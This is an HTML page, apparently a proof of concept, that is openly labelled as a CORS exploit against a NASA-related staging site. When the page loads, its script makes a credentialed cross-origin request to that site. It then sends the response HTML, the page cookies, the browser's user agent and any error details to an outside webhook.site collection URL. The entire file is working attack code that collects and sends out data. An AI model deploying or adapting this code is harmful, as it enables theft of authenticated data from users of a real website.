<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>üî¨ NASA CORS Debugger</title>
  <style>
    body {
      background: black;
      color: #00ff00;
      font-family: monospace;
      padding: 20px;
    }
    pre { white-space: pre-wrap; word-break: break-word; }
  </style>
</head>
<body>
  <h2>üõ∞Ô∏è Simulating NASA CORS Exploit (with Debug Info)...</h2>
  <pre id="log">Initializing...</pre>

  <script>
    const webhook = "https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de";
    const target = "https://datasearchstaging.globe.gov";
    const log = document.getElementById("log");

    function append(msg) {
      log.textContent += `\n${msg}`;
    }

    async function sendDebugReport(details) {
      await fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(details)
      });
    }

    async function runExploit() {
      append("[üöÄ] Sending fetch request with credentials...");

      try {
        const response = await fetch(target, {
          method: "GET",
          mode: "cors",
          credentials: "include"
        });

        const html = await response.text();
        append("[‚úÖ] Request successful!");
        append("[üç™] Cookies: " + document.cookie || "HttpOnly");
        append("[üß©] Snippet: \n" + html.slice(0, 600));

        await sendDebugReport({
          status: "success",
          html_snippet: html.slice(0, 600),
          cookies: document.cookie,
          userAgent: navigator.userAgent,
          target
        });

      } catch (error) {
        append("‚ùå Fetch failed.");
        append("üîé Error: " + error);
        append("üì° UserAgent: " + navigator.userAgent);

        let debug = {
          status: "fetch_failed",
          error: error.toString(),
          stack: error.stack || "No stack",
          userAgent: navigator.userAgent,
          connection: navigator.connection || "Unavailable",
          target,
          timestamp: new Date().toISOString()
        };

        try {
          let perf = performance.getEntriesByType("resource").filter(r => r.name.includes(target));
          debug.performance = perf;
        } catch (e) {
          debug.performance = "Could not read performance entries";
        }

        await sendDebugReport(debug);
      }
    }

    runExploit();
  </script>
</body>
</html>
